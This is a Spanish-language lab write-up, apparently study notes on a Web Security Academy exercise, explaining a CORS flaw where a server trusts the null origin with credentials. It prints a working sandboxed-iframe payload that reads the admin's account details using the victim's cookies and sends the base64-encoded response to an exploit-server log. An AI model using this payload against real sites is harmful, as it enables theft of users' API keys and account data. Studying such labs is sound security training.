En esta clase continuamos con el análisis de configuraciones inseguras de CORS, centrándonos en un caso donde el servidor confía en peticiones con origen null. Este tipo de comportamiento suele verse cuando se permiten solicitudes desde documentos cargados mediante iframes con ‘**sandbox**‘ y ‘**srcdoc**‘, lo cual representa un riesgo si además se permite el uso de cookies mediante ‘**Access-Control-Allow-Credentials**‘.

Aprovechamos esta vulnerabilidad para extraer la clave API del administrador. Para ello, construimos un exploit con un iframe que lanza una petición **XMLHttpRequest** desde un origen null, lo que permite al navegador incluir las cookies del administrador y acceder a información sensible. Finalmente, redirigimos la respuesta al registro del exploit server, lo que nos permite visualizar y enviar la clave para resolver el laboratorio.

Solucion
realizamos lo mismo no logeamos u en la respuesta del BS le damos forward y una ves ahi mandamos al repeater nuestra solicitud
![Pasted_image_20250728205329.png](/Imagenes/Pasted_image_20250728205329.png)
y bueno en la respuesta ene ACAC tenemos un true el cual podemos llegar a pensar que podemos tener un origin pero no sabes a cual asi que nosotros podemos mandar un NULL
y no lo acepta
![Pasted_image_20250728205717.png](/Imagenes/Pasted_image_20250728205717.png)

esto lo vamos a reflejar en un script de estilo iframe
(<iframe sandbox="allow-scripts" srcdoc='<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = 'https://exploit-0ab100c10401b08b806f5c8501ae002d.exploit-server.net/?apikey=' + btoa(req.responseText);
    };
    req.open('GET', 'https://0aeb00ce041cb072800e5dff00c20099.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script></iframe>)


Y con esto si revisamos de nuevo los logs obtendremos la apikey

![Pasted_image_20250728211153.png](/Imagenes/Pasted_image_20250728211153.png)


![Pasted_image_20250728211359.png](/Imagenes/Pasted_image_20250728211359.png)

y con esto lo convertimos a null
